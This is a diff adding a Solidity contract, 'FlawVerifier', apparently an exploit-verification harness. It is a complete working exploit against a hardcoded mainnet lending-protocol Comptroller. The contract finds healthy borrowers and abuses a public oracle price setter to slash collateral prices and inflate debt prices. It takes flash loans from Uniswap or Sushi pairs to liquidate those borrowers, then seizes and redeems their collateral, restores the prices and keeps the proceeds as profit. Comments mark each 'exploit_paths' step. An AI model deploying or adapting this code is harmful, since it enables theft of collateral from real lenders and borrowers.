@@ -1,0 +1,774 @@
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IComptrollerLike {
+    function oracle() external view returns (address);
+    function closeFactorMantissa() external view returns (uint256);
+    function allMarkets(uint256 index) external view returns (address);
+    function allBorrowers(uint256 index) external view returns (address);
+    function getAllMarkets() external view returns (address[] memory);
+    function getAllBorrowers() external view returns (address[] memory);
+    function markets(address cToken) external view returns (bool, uint256);
+    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
+    function liquidateCalculateSeizeTokens(address cTokenBorrowed, address cTokenCollateral, uint256 actualRepayAmount)
+        external
+        view
+        returns (uint256, uint256);
+}
+
+interface IOracleLike {
+    function getUnderlyingPrice(address cToken) external view returns (uint256);
+    function setUnderlyingPrice(address cToken, uint256 underlyingPriceMantissa) external;
+    function setDirectPrice(address asset, uint256 price) external;
+}
+
+interface ICTokenLike {
+    function underlying() external view returns (address);
+    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
+    function exchangeRateStored() external view returns (uint256);
+    function getCash() external view returns (uint256);
+    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+}
+
+interface IUniV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IUniV2Router {
+    function swapTokensForExactTokens(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+contract FlawVerifier {
+    address public constant TARGET_COMPTROLLER = 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F;
+
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+
+    address internal constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address internal constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
+
+    uint256 internal constant MAX_MARKETS_SCAN = 64;
+    uint256 internal constant MAX_BORROWERS_SCAN = 256;
+    uint256 internal constant MAX_REPAY_OPTIONS = 8;
+
+    struct Candidate {
+        address borrower;
+        address cDebt;
+        address debtToken;
+        address cCollateral;
+        address collateralToken;
+        uint256 borrowBalance;
+        uint256 collateralCTokenBalance;
+        uint256 redeemableCTokens;
+        uint256 originalDebtPrice;
+        uint256 originalCollateralPrice;
+        address flashPair;
+        address router;
+        address routeMid;
+    }
+
+    struct CallbackContext {
+        address borrower;
+        address cDebt;
+        address debtToken;
+        address cCollateral;
+        address collateralToken;
+        address flashPair;
+        address router;
+        address routeMid;
+        uint256 repayAmount;
+        uint256 repayToPairAmount;
+        uint256 originalDebtPrice;
+        uint256 originalCollateralPrice;
+    }
+
+    struct CollateralContext {
+        address cCollateral;
+        address collateralToken;
+        uint256 collateralCTokenBalance;
+        uint256 redeemableCTokens;
+        uint256 collateralPrice;
+    }
+
+    IComptrollerLike internal constant comptroller = IComptrollerLike(TARGET_COMPTROLLER);
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+    CallbackContext internal active;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        _profitToken = address(0);
+        _profitAmount = 0;
+
+        Candidate memory candidate = _findBestLiquidationCandidate();
+        require(candidate.borrower != address(0), "no-candidate");
+
+        uint256 directBalance = _tokenBalance(candidate.debtToken, address(this));
+
+        // exploit_paths[0]: the bug is the public oracle setter itself. We overwrite the live pool prices in-place.
+        _setManipulatedOraclePrices(
+            candidate.cCollateral, candidate.originalCollateralPrice, candidate.cDebt, candidate.originalDebtPrice
+        );
+
+        // exploit_paths[1]: the Comptroller now evaluates liquidity and liquidation checks using the forged prices.
+        uint256 repayAmount = _chooseRepayAmount(candidate, directBalance);
+        require(repayAmount != 0, "no-viable-repay");
+        _requireLiquidatable(candidate, repayAmount);
+
+        // exploit_paths[2]: prefer verifier-held debt tokens first; only use a real public flash swap when needed.
+        if (directBalance >= repayAmount) {
+            _directLiquidation(candidate, repayAmount);
+        } else {
+            require(candidate.flashPair != address(0), "no-flash-route");
+            active = CallbackContext({
+                borrower: candidate.borrower,
+                cDebt: candidate.cDebt,
+                debtToken: candidate.debtToken,
+                cCollateral: candidate.cCollateral,
+                collateralToken: candidate.collateralToken,
+                flashPair: candidate.flashPair,
+                router: candidate.router,
+                routeMid: candidate.routeMid,
+                repayAmount: repayAmount,
+                repayToPairAmount: _flashRepayAmount(repayAmount),
+                originalDebtPrice: candidate.originalDebtPrice,
+                originalCollateralPrice: candidate.originalCollateralPrice
+            });
+            _flashBorrow(candidate.flashPair, candidate.debtToken, repayAmount);
+            delete active;
+        }
+
+        // exploit_paths[3]: after seizing and redeeming real collateral, keep the realized leftover balance as profit.
+        require(_profitAmount > 0, "no-profit-realized");
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        _onFlashSwap(sender, amount0, amount1);
+    }
+
+    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        _onFlashSwap(sender, amount0, amount1);
+    }
+
+    receive() external payable {}
+
+    function _findBestLiquidationCandidate() internal view returns (Candidate memory best) {
+        uint256 bestScore;
+        address[] memory borrowers = _borrowers();
+        address[] memory markets = _markets();
+
+        uint256 borrowerCount = borrowers.length;
+        if (borrowerCount > MAX_BORROWERS_SCAN) borrowerCount = MAX_BORROWERS_SCAN;
+
+        uint256 marketCount = markets.length;
+        if (marketCount > MAX_MARKETS_SCAN) marketCount = MAX_MARKETS_SCAN;
+
+        for (uint256 borrowerIndex = 0; borrowerIndex < borrowerCount; ++borrowerIndex) {
+            address borrower = borrowers[borrowerIndex];
+            if (borrower == address(0)) continue;
+
+            (bool okLiquidity,, uint256 shortfall) = _safeAccountLiquidity(borrower);
+            if (!okLiquidity || shortfall != 0) continue;
+
+            for (uint256 collateralIndex = 0; collateralIndex < marketCount; ++collateralIndex) {
+                address cCollateral = markets[collateralIndex];
+                if (cCollateral == address(0)) continue;
+
+                (Candidate memory candidate, uint256 score) =
+                    _bestCandidateForBorrowerCollateral(borrower, cCollateral, markets, marketCount);
+                if (score > bestScore) {
+                    best = candidate;
+                    bestScore = score;
+                }
+            }
+        }
+    }
+
+    function _bestCandidateForBorrowerCollateral(
+        address borrower,
+        address cCollateral,
+        address[] memory markets,
+        uint256 marketCount
+    ) internal view returns (Candidate memory best, uint256 bestScore) {
+        (bool listedCollateral, uint256 collateralFactorMantissa) = _marketMeta(cCollateral);
+        if (!listedCollateral || collateralFactorMantissa == 0) return (best, 0);
+
+        (CollateralContext memory ctx, bool okCtx) = _buildCollateralContext(borrower, cCollateral);
+        if (!okCtx) return (best, 0);
+
+        for (uint256 debtIndex = 0; debtIndex < marketCount; ++debtIndex) {
+            address cDebt = markets[debtIndex];
+            if (cDebt == address(0) || cDebt == cCollateral) continue;
+
+            (Candidate memory candidate, uint256 score) = _candidateFromPair(borrower, ctx, cDebt);
+            if (score > bestScore) {
+                best = candidate;
+                bestScore = score;
+            }
+        }
+    }
+
+    function _buildCollateralContext(address borrower, address cCollateral)
+        internal
+        view
+        returns (CollateralContext memory ctx, bool ok)
+    {
+        (address collateralToken, bool okCollateralToken) = _underlyingOf(cCollateral);
+        if (!okCollateralToken) return (ctx, false);
+
+        (uint256 collateralPrice, bool okCollateralPrice) = _safeOraclePrice(cCollateral);
+        if (!okCollateralPrice) return (ctx, false);
+
+        (bool collateralOk, uint256 collateralBalance, uint256 redeemableCTokens) =
+            _borrowerCollateralState(borrower, cCollateral);
+        if (!collateralOk || collateralBalance == 0 || redeemableCTokens == 0) return (ctx, false);
+
+        ctx.cCollateral = cCollateral;
+        ctx.collateralToken = collateralToken;
+        ctx.collateralCTokenBalance = collateralBalance;
+        ctx.redeemableCTokens = redeemableCTokens;
+        ctx.collateralPrice = collateralPrice;
+        ok = true;
+    }
+
+    function _candidateFromPair(address borrower, CollateralContext memory ctx, address cDebt)
+        internal
+        view
+        returns (Candidate memory candidate, uint256 score)
+    {
+        (address debtToken, bool okDebtToken) = _underlyingOf(cDebt);
+        if (!okDebtToken) return (candidate, 0);
+
+        (bool debtSnapshotOk, uint256 borrowBalance) = _borrowBalanceOf(cDebt, borrower);
+        if (!debtSnapshotOk || borrowBalance == 0) return (candidate, 0);
+
+        (uint256 debtPrice, bool okDebtPrice) = _safeOraclePrice(cDebt);
+        if (!okDebtPrice) return (candidate, 0);
+
+        candidate.borrower = borrower;
+        candidate.cDebt = cDebt;
+        candidate.debtToken = debtToken;
+        candidate.cCollateral = ctx.cCollateral;
+        candidate.collateralToken = ctx.collateralToken;
+        candidate.borrowBalance = borrowBalance;
+        candidate.collateralCTokenBalance = ctx.collateralCTokenBalance;
+        candidate.redeemableCTokens = ctx.redeemableCTokens;
+        candidate.originalDebtPrice = debtPrice;
+        candidate.originalCollateralPrice = ctx.collateralPrice;
+
+        score = _candidateScore(candidate);
+        if (score == 0) return (candidate, 0);
+
+        if (_tokenBalance(candidate.debtToken, address(this)) == 0) {
+            (candidate.flashPair, candidate.router, candidate.routeMid) =
+                _findDexRoute(candidate.debtToken, candidate.collateralToken);
+            if (candidate.flashPair == address(0)) return (candidate, 0);
+        }
+    }
+
+    function _chooseRepayAmount(Candidate memory candidate, uint256 directBalance) internal view returns (uint256) {
+        uint256 limit = _closeFactorLimitedRepay(candidate.borrowBalance);
+        if (limit == 0) return 0;
+
+        uint256[MAX_REPAY_OPTIONS] memory options = _repayOptions(limit, directBalance);
+        for (uint256 i = 0; i < MAX_REPAY_OPTIONS; ++i) {
+            uint256 repayAmount = options[i];
+            if (repayAmount == 0) continue;
+
+            if (_wouldBecomeLiquidatable(candidate, repayAmount)) {
+                return repayAmount;
+            }
+        }
+
+        return 0;
+    }
+
+    function _repayOptions(uint256 borrowBalance, uint256 directBalance)
+        internal
+        pure
+        returns (uint256[MAX_REPAY_OPTIONS] memory options)
+    {
+        options[0] = directBalance > 0 && directBalance < borrowBalance ? directBalance : borrowBalance;
+        options[1] = borrowBalance / 2;
+        options[2] = borrowBalance / 4;
+        options[3] = borrowBalance / 10;
+        options[4] = borrowBalance / 100;
+        options[5] = borrowBalance / 1000;
+        options[6] = 1;
+        options[7] = 10 ** 6;
+
+        for (uint256 i = 0; i < MAX_REPAY_OPTIONS; ++i) {
+            if (options[i] > borrowBalance) options[i] = borrowBalance;
+        }
+    }
+
+    function _setManipulatedOraclePrices(
+        address cCollateral,
+        uint256 originalCollateralPrice,
+        address cDebt,
+        uint256 originalDebtPrice
+    ) internal {
+        uint256 collateralPrice = _reducedCollateralPrice(originalCollateralPrice);
+        uint256 debtPrice = _inflatedDebtPrice(originalDebtPrice);
+        _oracle().setUnderlyingPrice(cCollateral, collateralPrice);
+        _oracle().setUnderlyingPrice(cDebt, debtPrice);
+    }
+
+    function _requireLiquidatable(Candidate memory candidate, uint256 repayAmount) internal view {
+        require(_wouldBecomeLiquidatable(candidate, repayAmount), "manipulation-insufficient");
+    }
+
+    function _wouldBecomeLiquidatable(Candidate memory candidate, uint256 repayAmount) internal view returns (bool) {
+        if (repayAmount == 0 || repayAmount > candidate.borrowBalance) return false;
+
+        (bool okLiquidity,, uint256 shortfall) = _safeAccountLiquidity(candidate.borrower);
+        if (!okLiquidity || shortfall == 0) return false;
+
+        (bool okSeize, uint256 err, uint256 seizeTokens) =
+            _safeLiquidateCalculateSeizeTokens(candidate.cDebt, candidate.cCollateral, repayAmount);
+        if (!okSeize || err != 0) return false;
+        if (seizeTokens == 0 || seizeTokens > candidate.redeemableCTokens) return false;
+
+        return true;
+    }
+
+    function _directLiquidation(Candidate memory candidate, uint256 repayAmount) internal {
+        _forceApprove(candidate.debtToken, candidate.cDebt, repayAmount);
+        require(
+            ICTokenLike(candidate.cDebt).liquidateBorrow(candidate.borrower, repayAmount, candidate.cCollateral) == 0,
+            "liquidate-failed"
+        );
+
+        _restoreOraclePrices(
+            candidate.originalCollateralPrice, candidate.cCollateral, candidate.originalDebtPrice, candidate.cDebt
+        );
+        _redeemCollateral(candidate.cCollateral);
+        _recordProfit(candidate.collateralToken, candidate.cCollateral);
+    }
+
+    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1) internal {
+        require(sender == address(this), "bad-sender");
+        require(msg.sender == active.flashPair, "bad-pair");
+
+        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+        require(borrowedAmount == active.repayAmount, "bad-amount");
+
+        _forceApprove(active.debtToken, active.cDebt, active.repayAmount);
+        require(
+            ICTokenLike(active.cDebt).liquidateBorrow(active.borrower, active.repayAmount, active.cCollateral) == 0,
+            "liquidate-failed"
+        );
+
+        _restoreOraclePrices(
+            active.originalCollateralPrice, active.cCollateral, active.originalDebtPrice, active.cDebt
+        );
+        _redeemCollateral(active.cCollateral);
+        _repayFlashPair();
+        _recordProfit(active.collateralToken, active.cCollateral);
+    }
+
+    function _restoreOraclePrices(
+        uint256 originalCollateralPrice,
+        address cCollateral,
+        uint256 originalDebtPrice,
+        address cDebt
+    ) internal {
+        _oracle().setUnderlyingPrice(cCollateral, originalCollateralPrice);
+        _oracle().setUnderlyingPrice(cDebt, originalDebtPrice);
+    }
+
+    function _redeemCollateral(address cCollateral) internal {
+        uint256 seizedCTokens = _cTokenBalance(cCollateral, address(this));
+        require(seizedCTokens > 0, "no-collateral-seized");
+
+        uint256 exchangeRate = ICTokenLike(cCollateral).exchangeRateStored();
+        uint256 cash = ICTokenLike(cCollateral).getCash();
+        uint256 redeemableCTokens = _redeemableCTokens(cash, exchangeRate);
+        if (redeemableCTokens > seizedCTokens) redeemableCTokens = seizedCTokens;
+        require(redeemableCTokens > 0, "no-redeemable-collateral");
+        require(ICTokenLike(cCollateral).redeem(redeemableCTokens) == 0, "redeem-failed");
+    }
+
+    function _repayFlashPair() internal {
+        if (active.collateralToken == active.debtToken) {
+            _safeTransfer(active.debtToken, active.flashPair, active.repayToPairAmount);
+            return;
+        }
+
+        uint256 collateralBalance = _tokenBalance(active.collateralToken, address(this));
+        require(collateralBalance > 0, "no-collateral-underlying");
+
+        _forceApprove(active.collateralToken, active.router, collateralBalance);
+        address[] memory path = _buildPath(active.collateralToken, active.debtToken, active.routeMid);
+        IUniV2Router(active.router).swapTokensForExactTokens(
+            active.repayToPairAmount, collateralBalance, path, address(this), block.timestamp
+        );
+
+        _safeTransfer(active.debtToken, active.flashPair, active.repayToPairAmount);
+    }
+
+    function _recordProfit(address underlyingCollateral, address cCollateral) internal {
+        uint256 underlyingBalance = _tokenBalance(underlyingCollateral, address(this));
+        if (underlyingBalance > 0) {
+            _profitToken = underlyingCollateral;
+            _profitAmount = underlyingBalance;
+            return;
+        }
+
+        uint256 cTokenBal = _cTokenBalance(cCollateral, address(this));
+        if (cTokenBal > 0) {
+            _profitToken = cCollateral;
+            _profitAmount = cTokenBal;
+            return;
+        }
+
+        _profitToken = address(0);
+        _profitAmount = 0;
+    }
+
+    function _flashBorrow(address pair, address debtToken, uint256 amount) internal {
+        address token0 = IUniV2Pair(pair).token0();
+        address token1 = IUniV2Pair(pair).token1();
+        bytes memory data = abi.encode(uint256(1));
+
+        if (token0 == debtToken) {
+            IUniV2Pair(pair).swap(amount, 0, address(this), data);
+            return;
+        }
+
+        require(token1 == debtToken, "pair-mismatch");
+        IUniV2Pair(pair).swap(0, amount, address(this), data);
+    }
+
+    function _findDexRoute(address debtToken, address collateralToken)
+        internal
+        view
+        returns (address pair, address router, address routeMid)
+    {
+        (pair,) = _findFlashPairOnFactory(UNISWAP_FACTORY, debtToken);
+        if (pair != address(0) && _hasSwapPath(UNISWAP_FACTORY, collateralToken, debtToken)) {
+            routeMid = _pickRouteMid(UNISWAP_FACTORY, collateralToken, debtToken);
+            return (pair, UNISWAP_ROUTER, routeMid);
+        }
+
+        (pair,) = _findFlashPairOnFactory(SUSHI_FACTORY, debtToken);
+        if (pair != address(0) && _hasSwapPath(SUSHI_FACTORY, collateralToken, debtToken)) {
+            routeMid = _pickRouteMid(SUSHI_FACTORY, collateralToken, debtToken);
+            return (pair, SUSHI_ROUTER, routeMid);
+        }
+
+        return (address(0), address(0), address(0));
+    }
+
+    function _findFlashPairOnFactory(address factory, address debtToken)
+        internal
+        view
+        returns (address pair, address base)
+    {
+        address[4] memory bases = [WETH, USDC, USDT, DAI];
+        for (uint256 i = 0; i < bases.length; ++i) {
+            if (bases[i] == debtToken) continue;
+            pair = IUniV2Factory(factory).getPair(debtToken, bases[i]);
+            if (pair != address(0)) return (pair, bases[i]);
+        }
+        return (address(0), address(0));
+    }
+
+    function _hasSwapPath(address factory, address tokenIn, address tokenOut) internal view returns (bool) {
+        if (tokenIn == tokenOut) return true;
+        if (IUniV2Factory(factory).getPair(tokenIn, tokenOut) != address(0)) return true;
+
+        address[4] memory bases = [WETH, USDC, USDT, DAI];
+        for (uint256 i = 0; i < bases.length; ++i) {
+            address mid = bases[i];
+            if (mid == tokenIn || mid == tokenOut) continue;
+            if (
+                IUniV2Factory(factory).getPair(tokenIn, mid) != address(0)
+                    && IUniV2Factory(factory).getPair(mid, tokenOut) != address(0)
+            ) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function _pickRouteMid(address factory, address tokenIn, address tokenOut) internal view returns (address) {
+        if (tokenIn == tokenOut || IUniV2Factory(factory).getPair(tokenIn, tokenOut) != address(0)) return address(0);
+
+        address[4] memory bases = [WETH, USDC, USDT, DAI];
+        for (uint256 i = 0; i < bases.length; ++i) {
+            address mid = bases[i];
+            if (mid == tokenIn || mid == tokenOut) continue;
+            if (
+                IUniV2Factory(factory).getPair(tokenIn, mid) != address(0)
+                    && IUniV2Factory(factory).getPair(mid, tokenOut) != address(0)
+            ) {
+                return mid;
+            }
+        }
+        return address(0);
+    }
+
+    function _buildPath(address tokenIn, address tokenOut, address mid) internal pure returns (address[] memory path) {
+        if (mid == address(0)) {
+            path = new address[](2);
+            path[0] = tokenIn;
+            path[1] = tokenOut;
+            return path;
+        }
+
+        path = new address[](3);
+        path[0] = tokenIn;
+        path[1] = mid;
+        path[2] = tokenOut;
+    }
+
+    function _candidateScore(Candidate memory candidate) internal pure returns (uint256) {
+        if (candidate.borrowBalance == 0 || candidate.redeemableCTokens == 0) return 0;
+        if (candidate.originalDebtPrice == 0 || candidate.originalCollateralPrice == 0) return 0;
+        return candidate.borrowBalance * candidate.originalDebtPrice;
+    }
+
+    function _reducedCollateralPrice(uint256 originalCollateralPrice) internal pure returns (uint256) {
+        if (originalCollateralPrice <= 1) return 1;
+        uint256 reduced = originalCollateralPrice / 1_000_000;
+        return reduced == 0 ? 1 : reduced;
+    }
+
+    function _inflatedDebtPrice(uint256 originalDebtPrice) internal pure returns (uint256) {
+        if (originalDebtPrice == 0) return 0;
+        uint256 multiplier = 1_000_000;
+        if (originalDebtPrice > type(uint256).max / multiplier) {
+            return type(uint256).max;
+        }
+        return originalDebtPrice * multiplier;
+    }
+
+    function _underlyingOf(address cToken) internal view returns (address underlying, bool ok) {
+        try ICTokenLike(cToken).underlying() returns (address token) {
+            return (token, token != address(0));
+        } catch {
+            return (address(0), false);
+        }
+    }
+
+    function _markets() internal view returns (address[] memory list) {
+        try comptroller.getAllMarkets() returns (address[] memory markets_) {
+            return markets_;
+        } catch {
+            uint256 count = MAX_MARKETS_SCAN;
+            list = new address[](count);
+            for (uint256 i = 0; i < count; ++i) {
+                list[i] = _marketAt(i);
+            }
+        }
+    }
+
+    function _borrowers() internal view returns (address[] memory list) {
+        try comptroller.getAllBorrowers() returns (address[] memory borrowers_) {
+            return borrowers_;
+        } catch {
+            uint256 count = MAX_BORROWERS_SCAN;
+            list = new address[](count);
+            for (uint256 i = 0; i < count; ++i) {
+                list[i] = _borrowerAt(i);
+            }
+        }
+    }
+
+    function _marketAt(uint256 index) internal view returns (address market) {
+        try comptroller.allMarkets(index) returns (address listed) {
+            return listed;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _borrowerAt(uint256 index) internal view returns (address borrower) {
+        try comptroller.allBorrowers(index) returns (address listed) {
+            return listed;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _marketMeta(address cToken) internal view returns (bool listed, uint256 collateralFactorMantissa) {
+        try comptroller.markets(cToken) returns (bool isListed, uint256 factor) {
+            return (isListed, factor);
+        } catch {
+            return (false, 0);
+        }
+    }
+
+    function _borrowerCollateralState(address borrower, address cCollateral)
+        internal
+        view
+        returns (bool ok, uint256 cTokenBalance, uint256 redeemableCTokens)
+    {
+        (bool snapshotOk, uint256 err, uint256 balance,, uint256 exchangeRate) =
+            _safeAccountSnapshot(cCollateral, borrower);
+        if (!snapshotOk || err != 0 || balance == 0 || exchangeRate == 0) return (false, 0, 0);
+
+        (uint256 cash, bool cashOk) = _safeGetCash(cCollateral);
+        if (!cashOk || cash == 0) return (false, 0, 0);
+
+        redeemableCTokens = _redeemableCTokens(cash, exchangeRate);
+        if (redeemableCTokens > balance) redeemableCTokens = balance;
+        if (redeemableCTokens == 0) return (false, 0, 0);
+
+        return (true, balance, redeemableCTokens);
+    }
+
+    function _borrowBalanceOf(address cDebt, address borrower) internal view returns (bool ok, uint256 borrowBalance) {
+        (bool snapshotOk, uint256 err,, uint256 borrows,) = _safeAccountSnapshot(cDebt, borrower);
+        if (!snapshotOk || err != 0 || borrows == 0) return (false, 0);
+        return (true, borrows);
+    }
+
+    function _oracle() internal view returns (IOracleLike) {
+        return IOracleLike(comptroller.oracle());
+    }
+
+    function _safeOraclePrice(address cToken) internal view returns (uint256 price, bool ok) {
+        (bool success, bytes memory data) =
+            address(_oracle()).staticcall(abi.encodeWithSelector(IOracleLike.getUnderlyingPrice.selector, cToken));
+        if (!success || data.length < 32) return (0, false);
+        price = abi.decode(data, (uint256));
+        ok = price != 0;
+    }
+
+    function _safeAccountSnapshot(address cToken, address account)
+        internal
+        view
+        returns (bool ok, uint256 err, uint256 cTokenBal, uint256 borrowBalance, uint256 exchangeRate)
+    {
+        (bool success, bytes memory data) =
+            address(cToken).staticcall(abi.encodeWithSelector(ICTokenLike.getAccountSnapshot.selector, account));
+        if (!success || data.length < 128) return (false, 0, 0, 0, 0);
+        (err, cTokenBal, borrowBalance, exchangeRate) = abi.decode(data, (uint256, uint256, uint256, uint256));
+        return (true, err, cTokenBal, borrowBalance, exchangeRate);
+    }
+
+    function _safeGetCash(address cToken) internal view returns (uint256 cash, bool ok) {
+        (bool success, bytes memory data) =
+            address(cToken).staticcall(abi.encodeWithSelector(ICTokenLike.getCash.selector));
+        if (!success || data.length < 32) return (0, false);
+        cash = abi.decode(data, (uint256));
+        ok = true;
+    }
+
+    function _safeAccountLiquidity(address account)
+        internal
+        view
+        returns (bool ok, uint256 liquidity, uint256 shortfall)
+    {
+        (bool success, bytes memory data) =
+            address(comptroller).staticcall(abi.encodeWithSelector(IComptrollerLike.getAccountLiquidity.selector, account));
+        if (!success || data.length < 96) return (false, 0, 0);
+        (uint256 err, uint256 accountLiquidity, uint256 accountShortfall) =
+            abi.decode(data, (uint256, uint256, uint256));
+        if (err != 0) return (false, 0, 0);
+        return (true, accountLiquidity, accountShortfall);
+    }
+
+    function _safeLiquidateCalculateSeizeTokens(address cDebt, address cCollateral, uint256 repayAmount)
+        internal
+        view
+        returns (bool ok, uint256 err, uint256 seizeTokens)
+    {
+        (bool success, bytes memory data) = address(comptroller).staticcall(
+            abi.encodeWithSelector(
+                IComptrollerLike.liquidateCalculateSeizeTokens.selector, cDebt, cCollateral, repayAmount
+            )
+        );
+        if (!success || data.length < 64) return (false, 0, 0);
+        (err, seizeTokens) = abi.decode(data, (uint256, uint256));
+        return (true, err, seizeTokens);
+    }
+
+    function _tokenBalance(address token, address owner) internal view returns (uint256 balance) {
+        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
+        if (!success || data.length < 32) return 0;
+        balance = abi.decode(data, (uint256));
+    }
+
+    function _cTokenBalance(address cToken, address owner) internal view returns (uint256 balance) {
+        (bool success, bytes memory data) =
+            cToken.staticcall(abi.encodeWithSelector(ICTokenLike.balanceOf.selector, owner));
+        if (!success || data.length < 32) return 0;
+        balance = abi.decode(data, (uint256));
+    }
+
+    function _redeemableCTokens(uint256 cash, uint256 exchangeRate) internal pure returns (uint256) {
+        if (exchangeRate == 0) return 0;
+        return (cash * 1e18) / exchangeRate;
+    }
+
+    function _flashRepayAmount(uint256 amount) internal pure returns (uint256) {
+        return ((amount * 1000) / 997) + 1;
+    }
+
+    function _closeFactorLimitedRepay(uint256 borrowBalance) internal view returns (uint256) {
+        uint256 closeFactor;
+        try comptroller.closeFactorMantissa() returns (uint256 factor) {
+            closeFactor = factor;
+        } catch {
+            closeFactor = 0;
+        }
+
+        if (closeFactor == 0 || closeFactor > 1e18) {
+            return borrowBalance;
+        }
+
+        uint256 limited = (borrowBalance * closeFactor) / 1e18;
+        if (limited == 0) {
+            return borrowBalance > 1 ? 1 : borrowBalance;
+        }
+        return limited;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
+        ok;
+        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
+    }
+}
